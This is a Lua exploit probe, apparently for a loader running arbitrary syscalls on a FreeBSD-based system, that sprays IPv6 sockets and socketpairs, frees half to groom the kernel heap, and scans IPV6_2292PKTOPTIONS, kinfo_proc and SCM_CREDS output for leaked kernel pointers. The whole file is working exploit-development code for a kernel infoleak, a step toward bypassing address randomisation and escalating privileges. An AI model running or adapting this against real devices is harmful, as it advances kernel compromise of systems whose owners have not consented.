-- CRASH_CLASS: MODERATE
-- PROBE 143u: IPv6 pktopts kernel pointer scan — minimal, safe
--
-- Context: 143t crashed (fcall per call too expensive). Use loader wrappers
-- where available, fcall only for missing ones. Create fcall objects ONCE.

print("=== PROBE 143u: PKTOPTS MINIMAL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("[*] pid=" .. pid)

-- Create fcall objects ONCE for syscalls the loader may not wrap
local sc = syscall.syscall_address
local fn_socketpair = fcall(sc, 135)
local fn_sendmsg = fcall(sc, 28)
local fn_recvmsg = fcall(sc, 27)
local fn_sysctl = fcall(sc, 202)
print("[*] fcall objects ready")

--------------------------------------------------------------------
-- [A] Verify socketpair works via fcall
--------------------------------------------------------------------
print("")
print("--- [A] Socketpair ---")

local spfds = memory.alloc(16)
local rv_sp = to_num(fn_socketpair(uint64(1), uint64(1), uint64(0), uint64(spfds)))
local sp0 = to_num(memory.read_dword(spfds))
local sp1 = to_num(memory.read_dword(spfds + 4))
print("[A] socketpair ret=" .. rv_sp .. " fds=" .. sp0 .. "," .. sp1)

if rv_sp == 0 and sp0 > 0 then
    syscall.close(uint64(sp0))
    syscall.close(uint64(sp1))
    print("[A] OK")
end

--------------------------------------------------------------------
-- [B] Create IPv6 sockets with pktopts (using loader wrappers)
--------------------------------------------------------------------
print("")
print("--- [B] IPv6 spray ---")

local NUM = 50
local socks = {}
local optval = memory.alloc(16)

for i = 1, NUM do
    local ok, fd = pcall(function()
        return syscall.socket(uint64(28), uint64(2), uint64(0))
    end)
    if ok then
        local fd_num = to_num(fd)
        if fd_num >= 0 then
            memory.write_dword(optval, 1)
            local ok_s, rv_s = pcall(function()
                return syscall.setsockopt(uint64(fd_num), uint64(41), uint64(19), uint64(optval), uint64(4))
            end)
            if ok_s and to_num(rv_s) == 0 then
                table.insert(socks, fd_num)
            else
                syscall.close(uint64(fd_num))
            end
        end
    end
end

print("[B] Created " .. #socks .. " IPv6 socks")

--------------------------------------------------------------------
-- [C] Baseline: getsockopt IPV6_2292PKTOPTIONS(25)
--------------------------------------------------------------------
print("")
print("--- [C] Baseline opt25 ---")

local optbuf = memory.alloc(0x400)
local optlenp = memory.alloc(8)

-- Test if opt25 works at all
local test_fd = socks[1]
if test_fd then
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0) end
    memory.write_qword(optlenp, uint64(0x400))

    local ok, rv = pcall(function()
        return syscall.getsockopt(uint64(test_fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)
    if ok then
        local ret = to_num(rv)
        local got = to_num(memory.read_qword(optlenp))
        print("[C] opt25 ret=" .. ret .. " len=" .. got)

        if ret == 0 and got > 0 then
            -- Dump content
            for off = 0, math.min(got - 4, 124), 4 do
                local dw = to_num(memory.read_dword(optbuf + off))
                if dw ~= 0 then
                    print("[C]   +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", dw))
                end
            end

            for off = 0, math.min(got - 8, 0x3F8), 8 do
                local q = memory.read_qword(optbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("[C] !!! KPTR +" .. string.format("%X", off) .. "=" .. hex(q))
                    end
                end
            end
        else
            print("[C] opt25 not available (ret=" .. ret .. ")")
        end
    else
        print("[C] opt25 pcall fail: " .. tostring(rv))
    end

    -- Also test individual options
    for _, optnum in ipairs({19, 20, 24}) do
        for off = 0, 0xFF, 4 do memory.write_dword(optbuf + off, 0) end
        memory.write_qword(optlenp, uint64(0x100))
        local ok2, rv2 = pcall(function()
            return syscall.getsockopt(uint64(test_fd), uint64(41), uint64(optnum), uint64(optbuf), uint64(optlenp))
        end)
        if ok2 then
            local ret2 = to_num(rv2)
            local got2 = to_num(memory.read_qword(optlenp))
            print("[C] opt" .. optnum .. " ret=" .. ret2 .. " len=" .. got2)
        end
    end
end

--------------------------------------------------------------------
-- [D] Close half, spray socketpairs, re-read survivors
--------------------------------------------------------------------
print("")
print("--- [D] Close+spray+read ---")

local kept = {}
for i = 1, #socks do
    if i % 2 == 0 then
        syscall.close(uint64(socks[i]))
    else
        table.insert(kept, socks[i])
    end
end
print("[D] Freed " .. (#socks - #kept) .. ", kept " .. #kept)

-- Spray socketpairs
local spray = {}
for i = 1, 30 do
    local pfds = memory.alloc(16)
    local rv = to_num(fn_socketpair(uint64(1), uint64(1), uint64(0), uint64(pfds)))
    if rv == 0 then
        local a = to_num(memory.read_dword(pfds))
        local b = to_num(memory.read_dword(pfds + 4))
        table.insert(spray, {a=a, b=b})
    end
end
print("[D] Sprayed " .. #spray .. " socketpairs")

-- Re-read kept sockets
local kptr_total = 0
for idx, fd in ipairs(kept) do
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0) end
    memory.write_qword(optlenp, uint64(0x400))

    local ok, rv = pcall(function()
        return syscall.getsockopt(uint64(fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)
    if ok and to_num(rv) == 0 then
        local got = to_num(memory.read_qword(optlenp))
        for off = 0, math.min(got - 8, 0x3F8), 8 do
            local q = memory.read_qword(optbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptr_total = kptr_total + 1
                    if kptr_total <= 10 then
                        print("[D] !!! KPTR fd=" .. fd .. " +" .. string.format("%X", off) .. "=" .. hex(q))
                    end
                end
            end
        end
    end
end
print("[D] kernel pointers: " .. kptr_total)

--------------------------------------------------------------------
-- [E] kinfo_proc deep scan — check for leaked proc pointer
--------------------------------------------------------------------
print("")
print("--- [E] kinfo_proc ---")

local mib = memory.alloc(24)
local outbuf = memory.alloc(0x800)
local olp = memory.alloc(8)

memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 1)  -- KERN_PROC_PID
memory.write_dword(mib + 12, pid)
memory.write_qword(olp, uint64(0x800))

local ok_ki, rv_ki = pcall(function()
    return fn_sysctl(uint64(mib), uint64(4), uint64(outbuf), uint64(olp), uint64(0), uint64(0))
end)

if ok_ki then
    local ret_ki = to_num(rv_ki)
    local got_ki = to_num(memory.read_qword(olp))
    print("[E] kinfo_proc ret=" .. ret_ki .. " size=" .. got_ki)

    if ret_ki == 0 and got_ki > 0 then
        local ki_kptrs = 0
        for off = 0, math.min(got_ki - 8, 0x7F8), 8 do
            local q = memory.read_qword(outbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    ki_kptrs = ki_kptrs + 1
                    print("[E] !!! KPTR +" .. string.format("%X", off) .. "=" .. hex(q))
                end
            end
        end
        print("[E] kinfo kptrs: " .. ki_kptrs)

        -- Dump key fields for structure ID
        -- ki_structsize at +0
        -- ki_pid at +0x48 (72)
        -- ki_ppid at +0x4C (76)
        -- ki_uid at +0x58 (88)
        -- ki_comm at +0x1BF (447) — process name
        print("[E] structsize=" .. to_num(memory.read_dword(outbuf)))
        print("[E] ki_pid=" .. to_num(memory.read_dword(outbuf + 0x48)))
        print("[E] ki_ppid=" .. to_num(memory.read_dword(outbuf + 0x4C)))
        print("[E] ki_uid=" .. to_num(memory.read_dword(outbuf + 0x58)))

        -- Read ki_comm (process name) at different possible offsets
        for _, off in ipairs({0x1BF, 0x1CB, 0x1D7, 0x1E3}) do
            local name = ""
            for i = 0, 15 do
                local b = to_num(memory.read_byte(outbuf + off + i))
                if b == 0 then break end
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 2 then
                print("[E] comm@" .. string.format("%X", off) .. "=" .. name)
            end
        end

        -- Check the classic kernel pointer fields in kinfo_proc
        -- On FreeBSD, these are typically zeroed for unprivileged callers
        local ptr_fields = {
            {0x130, "ki_paddr"},
            {0x138, "ki_addr"},
            {0x148, "ki_tracep"},
            {0x150, "ki_textvp"},
            {0x158, "ki_fd"},
            {0x160, "ki_vmspace"},
            {0x168, "ki_wchan"},
        }
        for _, f in ipairs(ptr_fields) do
            local q = memory.read_qword(outbuf + f[1])
            if q then
                local h, l = get_hi_lo(q)
                local tag = ""
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then tag = " ***KPTR***" end
                if h ~= 0 or l ~= 0 then
                    print("[E] " .. f[2] .. "=" .. hex(q) .. tag)
                end
            end
        end
    end
else
    print("[E] sysctl FAIL: " .. tostring(rv_ki))
end

--------------------------------------------------------------------
-- [F] SCM_CREDS via sendmsg/recvmsg
--------------------------------------------------------------------
print("")
print("--- [F] SCM_CREDS ---")

local scm_p = memory.alloc(16)
if to_num(fn_socketpair(uint64(1), uint64(1), uint64(0), uint64(scm_p))) == 0 then
    local s0 = to_num(memory.read_dword(scm_p))
    local s1 = to_num(memory.read_dword(scm_p + 4))

    -- LOCAL_CREDS: SOL_LOCAL=0, LOCAL_CREDS=2
    memory.write_dword(optval, 1)
    local ok_lc, rv_lc = pcall(function()
        return syscall.setsockopt(uint64(s1), uint64(0), uint64(2), uint64(optval), uint64(4))
    end)
    print("[F] LOCAL_CREDS ret=" .. tostring(rv_lc))

    -- sendmsg
    local msg = memory.alloc(0x40)
    local iov = memory.alloc(0x10)
    local d = memory.alloc(8)
    memory.write_dword(d, 0x41)

    memory.write_qword(iov, uint64(d))
    memory.write_qword(iov + 8, uint64(4))

    for off = 0, 0x3C, 4 do memory.write_dword(msg + off, 0) end
    memory.write_qword(msg + 16, uint64(iov))
    memory.write_dword(msg + 24, 1)

    local ok_sm, rv_sm = pcall(function()
        return fn_sendmsg(uint64(s0), uint64(msg), uint64(0))
    end)
    print("[F] sendmsg=" .. tostring(rv_sm))

    -- recvmsg
    local rcm = memory.alloc(0x100)
    local rd = memory.alloc(0x40)
    local rv2 = memory.alloc(0x10)
    local rmsg = memory.alloc(0x40)

    for off = 0, 0xFC, 4 do memory.write_dword(rcm + off, 0xEE) end

    memory.write_qword(rv2, uint64(rd))
    memory.write_qword(rv2 + 8, uint64(0x40))

    for off = 0, 0x3C, 4 do memory.write_dword(rmsg + off, 0) end
    memory.write_qword(rmsg + 16, uint64(rv2))
    memory.write_dword(rmsg + 24, 1)
    memory.write_qword(rmsg + 32, uint64(rcm))
    memory.write_dword(rmsg + 40, 0x100)

    local ok_rm, rv_rm = pcall(function()
        return fn_recvmsg(uint64(s1), uint64(rmsg), uint64(0))
    end)
    print("[F] recvmsg=" .. tostring(rv_rm))

    if ok_rm and to_num(rv_rm) >= 0 then
        local clen = to_num(memory.read_dword(rmsg + 40))
        print("[F] controllen=" .. clen)
        if clen >= 12 then
            print("[F] cmsg_len=" .. to_num(memory.read_dword(rcm)))
            print("[F] cmsg_level=" .. to_num(memory.read_dword(rcm + 4)))
            print("[F] cmsg_type=" .. to_num(memory.read_dword(rcm + 8)))

            for off = 12, math.min(to_num(memory.read_dword(rcm)), 0x60), 4 do
                local dw = to_num(memory.read_dword(rcm + off))
                if dw ~= 0 and dw ~= 0xEE then
                    print("[F]   +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", dw))
                end
            end

            for off = 0, math.min(clen - 8, 0xF8), 8 do
                local q = memory.read_qword(rcm + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("[F] !!! KPTR cmsg +" .. string.format("%X", off) .. "=" .. hex(q))
                    end
                end
            end
        end
    end

    syscall.close(uint64(s0))
    syscall.close(uint64(s1))
end

--------------------------------------------------------------------
-- Cleanup
--------------------------------------------------------------------
print("")
for _, fd in ipairs(kept) do pcall(function() syscall.close(uint64(fd)) end) end
for _, p in ipairs(spray) do
    pcall(function() syscall.close(uint64(p.a)) end)
    pcall(function() syscall.close(uint64(p.b)) end)
end

print("=== PROBE 143u COMPLETE ===")
